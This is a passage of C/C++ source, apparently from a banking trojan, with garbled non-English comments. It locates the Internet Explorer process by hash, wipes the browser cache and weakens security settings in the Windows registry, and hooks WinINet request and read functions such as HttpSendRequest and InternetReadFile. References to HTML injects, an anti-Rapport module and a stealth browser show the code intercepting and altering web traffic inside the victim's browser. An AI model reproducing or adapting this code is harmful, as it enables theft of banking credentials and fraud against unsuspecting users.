		 dwProcessHash == 0x490A0972 )
	{
		return true;
	}

	return false;
}

void IEClearCache()
{
	// ������� ������� ��� �������� ����������. 
	BOOL bResult = FALSE;
	BOOL bDone = FALSE;

	LPINTERNET_CACHE_ENTRY_INFO lpCacheEntry = NULL;

	DWORD dwTrySize, dwEntrySize = 4096; 

	HANDLE hCacheDir = NULL;

	DWORD dwError = ERROR_INSUFFICIENT_BUFFER;

	do
	{
		switch ( dwError )
		{
			case ERROR_INSUFFICIENT_BUFFER:

				if ( lpCacheEntry != NULL )
				{
					MemFree( lpCacheEntry );
				}

				lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFO)MemAlloc( dwEntrySize );

				if ( lpCacheEntry == NULL )
				{
					return;
				}

				lpCacheEntry->dwStructSize = dwEntrySize;

				dwTrySize = dwEntrySize;

				BOOL bSuccess;

				if ( hCacheDir == NULL )
				{
					bSuccess = ( hCacheDir = (HANDLE)pFindFirstUrlCacheEntryA( NULL, lpCacheEntry,&dwTrySize ) ) != NULL;
				}
				else
				{
					bSuccess = (BOOL)pFindNextUrlCacheEntryA( hCacheDir, lpCacheEntry, &dwTrySize );
				}

				if ( bSuccess )
				{
					dwError = ERROR_SUCCESS;
				}
				else
				{
					dwError		= (DWORD)pGetLastError();
					dwEntrySize = dwTrySize; // ���������� ����� ������ ������
				}

			break;
		
			case ERROR_NO_MORE_ITEMS:

				bDone	= TRUE;
				bResult = TRUE;

			break;

			case ERROR_SUCCESS:

				pDeleteUrlCacheEntry( lpCacheEntry->lpszSourceUrlName );
	
				dwTrySize = dwEntrySize;

				if ( pFindNextUrlCacheEntryA( hCacheDir, lpCacheEntry, &dwTrySize ) )
				{
					dwError = ERROR_SUCCESS;
				}
				else
				{
					dwError = (DWORD)pGetLastError();
					dwEntrySize = dwTrySize;
				}

			break;
				
			default:

				bDone = TRUE;

			break;
		}

		if( bDone )
		{
			MemFree( lpCacheEntry );

			if ( hCacheDir )
			{
				pFindCloseUrlCache( hCacheDir );
			}
		}
	}
	while( !bDone );

	return;
}

//*********************************************************************
//  UpdateIERegistry - ������ ��������� �������, ��� ����������
//  	�������� ������� ������������
//*********************************************************************


void UpdateIERegistry()
{
	PCHAR ParamPath1 = "Software\\Microsoft\\Internet Explorer\\Privacy";
	PCHAR ParamPath2 = "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3";

	PCHAR ParmName1 = "CleanCookies";
	PCHAR ParmName2 = "1609";

	Registry::SetValueDWORD(HKEY_CURRENT_USER, ParamPath1,  ParmName1, 0);
	Registry::SetValueDWORD(HKEY_CURRENT_USER, ParamPath2,  ParmName2, 0);
	Registry::SetValueDWORD(HKEY_LOCAL_MACHINE, ParamPath2,  ParmName2, 0);
}


//	HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Privacy\CleanCookies=0
//	HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1609=0
//	HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1609=0


bool HookInternetExplorer()
{
	// ������� ������ ���� �� ������� ������� ������� ����������
	// Internet Explorer ��� �������� ����������
	// �������� ������ � ������ ������ �� �������� �������� ����������
	if ( !IsInternetExplorer())
		return false;

    IEDBG("������������� InternetExplorer:");

	#ifdef HTMLInjectsH
		IEDBG("�������������� ������");
		Config::Initialize(NULL, true, false);
	#endif


//	InitScreenLib();

	/*#ifdef antirapportH 
		StartRapportWaitThread();
	#else*/
		HookInternetExplorerApi();
	//#endif

	return true;
}


bool HookInternetExplorerApi()
{
	//  HookInternetExplorerApi - ������� ������ ���� �� �������� API
	//  ������� ���������� �������� ��������� ��� �������� �������

     IEDBG("�������� ������� WinAPI");

	UnhookIE();

	IEDBG("�������������� ���������� ������");
    InitIEGlobalData();

    IEDBG("������ ��������� �������");
	UpdateIERegistry();


	DWORD dwHash_HttpSendRequestA	 = 0x9F13856A;
	DWORD dwHash_HttpSendRequestW	 = 0x9F13857C;

	DWORD dwHash_HttpSendRequestExA  = 0xE15B9B85;
	DWORD dwHash_HttpSendRequestExW  = 0xE15B9B93;

	DWORD dwHash_InternetReadFile	 = 0x1A212962;

	DWORD dwHash_InternetReadFileExA = 0x2C523864;
	DWORD dwHash_InternetReadFileExW = 0x2C523872;

	DWORD dwHash_InternetQueryDataAvailable = 0x7EDEC584;

	DWORD dwHash_InternetCloseHandle = 0x7314FB0C;

	DWORD Hash_HttpOpenRequestA = 0x1510002F;
	DWORD Hash_HttpOpenRequestW = 0x15100039;


	if ( HookApi( 8, dwHash_HttpSendRequestA, (DWORD)&HOOK_HttpSendRequestA ) )
	{
		__asm mov [REAL_HttpSendRequestA], eax
	}

	if ( HookApi( 8, dwHash_HttpSendRequestW, (DWORD)&HOOK_HttpSendRequestW ) )
	{
		__asm mov [REAL_HttpSendRequestW], eax
	}

	if ( HookApi( 8, dwHash_HttpSendRequestExA, (DWORD)&HOOK_HttpSendRequestExA ) )
	{
		__asm mov [REAL_HttpSendRequestExA], eax
	}

	if ( HookApi( 8, dwHash_HttpSendRequestExW, (DWORD)&HOOK_HttpSendRequestExW ) )
	{
		__asm mov [REAL_HttpSendRequestExW], eax
	}

	if ( HookApi( 8, dwHash_InternetReadFile, (DWORD)&HOOK_InternetReadFile ) )
	{
		__asm mov [REAL_InternetReadFile], eax
	}

	if ( HookApi( 8, dwHash_InternetReadFileExA, (DWORD)&HOOK_InternetReadFileExA ) )
	{
		__asm mov [REAL_InternetReadFileExA], eax
	}

	if ( HookApi( 8, dwHash_InternetReadFileExW, (DWORD)&HOOK_InternetReadFileExW ) )
	{
		__asm mov [REAL_InternetReadFileExW], eax
	}

	if ( HookApi( 8, dwHash_InternetQueryDataAvailable, (DWORD)&HOOK_InternetQueryDataAvailable ) )
	{
		__asm mov [REAL_InternetQueryDataAvailable], eax
	}

	if ( HookApi( 8, dwHash_InternetCloseHandle, (DWORD)&HOOK_InternetCloseHandle ) )
	{
		__asm mov [REAL_InternetCloseHandle], eax
	}

	if ( HookApi( 8, Hash_HttpOpenRequestA, (DWORD)&HOOK_HttpOpenRequestA ) )
	{
		__asm mov [REAL_HttpOpenRequestA], eax
	}

	if ( HookApi( 8, Hash_HttpOpenRequestW, (DWORD)&HOOK_HttpOpenRequestW ) )
	{
		__asm mov [REAL_HttpOpenRequestW], eax
	}



	#ifdef StealthBrowserH
		SetHooksForSB();
	#endif

    IEDBG("������� WinAPI ������� �����������");

	return true;
}




